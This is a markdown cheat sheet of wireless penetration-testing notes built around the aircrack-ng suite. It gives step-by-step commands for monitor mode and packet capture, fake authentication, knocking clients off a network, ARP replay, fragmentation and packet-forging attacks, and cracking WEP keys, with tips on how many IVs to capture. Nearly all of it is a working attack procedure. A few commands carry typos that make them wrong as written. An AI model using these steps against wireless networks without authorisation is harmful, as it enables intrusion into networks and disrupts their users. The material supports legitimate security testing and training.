# Wireless Pentesting Notes
## For the purpose of this page I will be using wlan1 and wlan1mon to represent the network card I'm using.

# Familiarizing yourself with your tools
* iwconfig - what's going on?

# Airmon-ng 
* airmon-ng [start|stop] interface name [channel]
* airmon-ng [check|check] kill
* iwlist wlan1mon [channel] - Show that the monitor mode interface is	listening	on the desired channel frequency
 
 # Airodump-ng
* airodump-ng wlan1 - Start airmon-ng first
* airodump-ng --bssid [BSSID] -c Channel -w [FILENAME] wlan1 - Start airmon-ng on specific channel first

# Airreplay-ng
* aireplay-ng -9 wlan1mon - Injection test 
* aireplay-ng -9 -i wlan0 wlan1mon - Card to Card attack Injection test

# Cracking WEP 
* airmon-ng start wlan1 [CHANNEL]
* airodump-ng -c [CHANNEL] –bssid [BSSID] -w [FILE] wlan1mon - if you don't specify the channel then it will hop whgen you perform an attack
* Get MAC address with macchanger --show wlan1mon
* aireplay-ng -1 0 -e [ESSID] -a [BSSID] -h [OurMACAddress] wlan1mon - Fake authentication attack
 
 # Deauthenticate Clients
 * aireplay-ng -0 1 -a [AP MAC] -c [Client MAC] wlan1mon

# ARP Request Relay Attack + WEP Cracking
* Run airodump-ng while performing this attack and output the results to a file in order to run aircrack-ng on it with the following commands:
* airodump-ng -c [CHANNEL] --bssid [BSSID] -w [FILENAME] wlan1mon
* Ensure that you are authenticated into the network via a fake authentication attack: aireplay-ng -1 0 -e [ESSID] -a [AP MAC] -h [OurMACAddress] wlan1mon
* aireplay-ng -3 -b [AP MAC] -h [OurMACAddress] wlan1mon - launch the ARP request replay attack
* While our previous command is running deauthenticate the victim:  aireplay-ng -0 1 -a [AP MAC] -c [CLIENT MAC] wlan1mon
* Once a large amount of IVs have been captured crack them with: air-crack.ng [FILENAME]
 
# Cracking WEP via Client
* Set your WiFi card to monitor mode with airmon-ng
* Run airodump-ng and output to a file: airodump-ng -c [CHANNEL] --bssid [BSSID] -w [FILENAME] wlan1mon
* Fake authenticate to the AP: aireplay-ng -1 0 -e [ESSID] -a [AP MAC] -h [OurMACAddress] wlan1mon
* Natural packet replay: aireplay-ng -2 -b [AP MAC] -d FF:FF:FF:FF:FF:FF -t 1 wlan1mon 
* Modified packet replay: aireplay-ng -2 -b [AP MAC] -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 wlan1mon
* Running the attack: aireplay-ng -2 -b [AP MAC] -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan1mon
* Replay from file: aireplay-ng -2 -r [CAPTURE] wlan1mon
* Crack ze key: aircrack-ng -z [CAPTURE]

# Fragmentation Attack - No clients on the AP
* Set your WiFi card to monitor mode with airmon-ng
* Run airodump-ng and output to a file: airodump-ng -c [CHANNEL] --bssid [BSSID] -w [FILENAME] wlan1mon
* Fake authenticate and send keep alive packets: aireplay-ng -1 6000 -e [ESSID] -b [AP MAC] -h [OurMACAddress] wlan1mon
* Launch fragmentation attack with airreplay.ng: aireplay-ng -5 -b [AP MAC] -h [OurMACAddress] wlan1mon
* Use packetforge-ng to generate an ARP request packet with the XOR file: packetforge-ng -0 -a [AP MAC] -h [OurMACAddress] -l [SourceIP e.g. 192.168.1.100] -k [DestinationIP e.g. 192.168.1.255] -y [.xor FILE] -w arprequest
* Replay this packet with aireplay.ng: aireplay.ng -2 -r arprequest.cap wlan1mon
 
# General Approach to Cracking WEP keys
* https://www.aircrack-ng.org/doku.php?id=aircrack-ng#general_approach_to_cracking_wep_keys
* The number of initialization vectors (IVs) that you need to determine the WEP key varies dramatically by key length and access point. Typically you need 250,000 or more unique IVs for 64 bit keys and 1.5 million or more for 128 bit keys. 
* Generally, don't try to crack the WEP key until you have 200,000 IVs or more. If you start too early, aircrack tends to spend too much time brute forcing keys and not properly applying the statistical techniques. 
* Start by trying 64 bit keys “aircrack-ng -n 64 [FILENAME]"
*  It is surprising how many APs only use 64 bit keys. If it does not find the 64 bit key in 5 minutes, restart aircrack in the generic mode: “aircrack-ng captured-data.cap”. Then at each 100,000 IVs mark, retry the “aircrack-ng -n 64 captured-data.cap” for 5 minutes.
* Once you hit 600,000 IVs, switch to testing 128 bit keys. At this point it is unlikely (but not impossible) that it is a 64 bit key and 600,000 IVs did not crack it. So now try “aircrack-ng captured-data.cap”.
* Once you hit 2 million IVs, try changing the fudge factor to “-f 4”. Run for at least 30 minutes to one hour. Retry, increasing the fudge factor by adding 4 to it each time. Another time to try increasing the fudge factor is when aircrack-ng stops because it has tried all the keys.
